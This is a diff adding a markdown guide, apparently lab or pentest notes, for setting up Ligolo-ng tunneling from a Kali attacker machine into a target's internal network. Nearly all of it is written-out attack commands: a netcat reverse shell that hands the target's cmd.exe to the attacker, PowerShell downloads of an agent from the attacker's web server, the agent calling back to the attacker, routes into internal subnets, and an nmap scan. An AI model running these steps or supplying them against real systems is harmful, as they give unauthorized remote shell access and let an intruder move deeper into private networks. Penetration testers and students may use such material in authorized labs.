@@ -1,0 +1,170 @@
+```markdown
+# Ligolo Setup Guide
+
+## Symbols & Notations
+- **$** : Turbo User (Non-root user on attacker machine)
+- **#** : Root User
+- **C:\>** : Target Machine (Windows)
+- **@** : Reverse Shell
+- **##** : Ligolo-Proxy-Server
+
+---
+
+## 1 - Place `nc` Binary on Target Machine
+
+Using a Python HTTP server:
+
+```bash
+┌──(turbo㉿kali)-[/opt/Static\ Binaries/Windows\ Binaries]
+└─$ python -m http.server 80
+```
+
+Access the server from the target machine:
+
+```
+http://192.168.1.13
+```
+
+---
+
+## 2 - Get a Reverse Shell
+
+Start a listener on port 443:
+
+```bash
+$ nc -nlvp 443
+```
+
+On the target machine, run:
+
+```powershell
+C:\> nc64.exe 192.168.1.13 443 -e cmd.exe
+```
+
+After executing this, the reverse shell will be active on the attacker’s listener.
+
+---
+
+## 3 - Transfer Ligolo Agent to Target Machine
+
+Start a Python HTTP server:
+
+```bash
+┌──(turbo㉿kali)-[/opt/Static\ Binaries/Ligolo_ng/win]
+└─$ python -m http.server 80
+```
+
+On the reverse shell, download the agent:
+
+```powershell
+@ powershell Invoke-WebRequest "http://192.168.1.13/agent.exe" -OutFile "C:\Users\Public\agent.exe"
+```
+
+Alternative method:
+
+```powershell
+@ iwr -uri http://192.168.45.13/agent.exe -Outfile agent.exe
+```
+
+Or manually visit:
+
+```
+http://192.168.1.13
+```
+
+---
+
+## 4 - Start Ligolo Proxy Server on Attacker Machine
+
+Run the following as **root**:
+
+```bash
+# ip tuntap add user turbo mode tun ligolo
+# ip link set ligolo up
+# cd /opt/Static\ Binaries/Ligolo_ng/win
+# chmod +x proxy
+```
+
+Start the local proxy server:
+
+```bash
+# ./proxy -selfcert -laddr 0.0.0.0:80
+# ligolo-proxy -selfcert -laddr 0.0.0.0:80
+```
+
+---
+
+## 5 - Start Ligolo Agent on Target Machine
+
+### On Windows
+
+```powershell
+@ agent.exe -connect 192.168.1.13:80 -ignore-cert
+```
+
+### On Linux
+
+```bash
+@ agent -connect 192.168.1.13:80 -ignore-cert
+```
+
+---
+
+## 6 - Configure Network Routing on Attacker Machine
+
+Check agent session:
+
+```bash
+## ligolo-ng » session
+## [Agent : root@webserver] » ifconfig
+```
+
+Add an internal network route:
+
+```bash
+# ip route add 192.168.2.0/24 dev ligolo
+```
+
+Verify routes:
+
+```bash
+# route -n
+# ip route
+```
+
+Check active tunnels:
+
+```bash
+## [Agent : root@webserver] » tunnel_list
+```
+
+---
+
+## 7 - Visit Services from Attacker Machine
+
+- **http://192.168.1.20** - Bound to port 80
+- **http://192.168.2.10** - Bound to site2
+- **http://127.0.0.1** - Bound to site1
+
+---
+
+## 8 - Access Agent’s Local Ports
+
+```bash
+# ip route add 240.0.0.1/32 dev ligolo
+# ip route
+```
+
+Scan the network:
+
+```bash
+# nmap -v -p- -sT 240.0.0.1
+```
+
+Visit from the attacker machine:
+
+```
+http://240.0.0.1
+```
+```
+
